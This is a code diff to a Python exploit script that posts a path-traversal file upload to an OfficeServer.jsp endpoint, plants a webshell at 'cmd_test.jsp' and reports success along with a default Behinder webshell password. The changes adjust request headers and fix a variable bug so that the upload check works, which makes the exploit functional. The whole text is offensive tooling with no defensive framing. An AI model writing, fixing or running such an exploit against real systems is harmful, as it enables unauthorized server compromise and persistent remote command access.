@@ -17,7 +17,7 @@ def main(target_url):
         target_url += '/' 
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
-        "Accept": "text/html，application/xhtml+xml,application/xml", 
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
         "Connection": "Keep-Alive"
         }
     exp_url = target_url+"defaultroot/public/iWebOfficeSign/OfficeServer.jsp"
@@ -33,7 +33,7 @@ FILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw
     try:
         requests.packages.urllib3.disable_warnings()
         upload = requests.post(exp_url, headers=headers, data=data, verify=False)
-        if respones1.status_code == 200:
+        if upload.status_code == 200:
             shell_url=target_url+'defaultroot/public/edit/cmd_test.jsp'
             console.print(now_time() + ' [SUCCESS]  上传webshell成功，默认冰蝎密码:{}'.format(shell_url), style='bold green')
         else:
